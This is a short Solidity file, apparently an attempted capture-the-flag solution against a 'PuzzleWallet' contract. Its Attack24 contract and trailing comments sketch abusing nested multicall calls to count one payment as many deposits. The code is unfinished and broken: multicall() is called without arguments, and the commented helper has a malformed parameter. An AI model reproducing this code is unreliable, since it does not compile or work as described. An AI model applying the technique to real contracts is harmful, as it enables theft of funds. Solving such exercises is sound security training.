// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./24-puzzlewallet.sol";

contract Attack24 {
    PuzzleWallet target;

    constructor(address _targetAddress) {
        target = PuzzleWallet(_targetAddress);
    }

    function attack() public {
        // multicall attack
        // set the data argument as a abi encoded call to deposit
        target.multicall();
    }
}


// function encodeCall(address -to, uint256 _amount) external pure returns (bytes memory) {
//     return abi.encodeCall(IERC20.transfer, (to, amount));
// }


// We can however perform indirect calls, so if we pass multicall a data array that contains 
// calls to multicall.  So multicall will call multicall 30 times, and each individual call within
// that will call deposit() once.  Thus we get 30 deposits in a single deposit() call.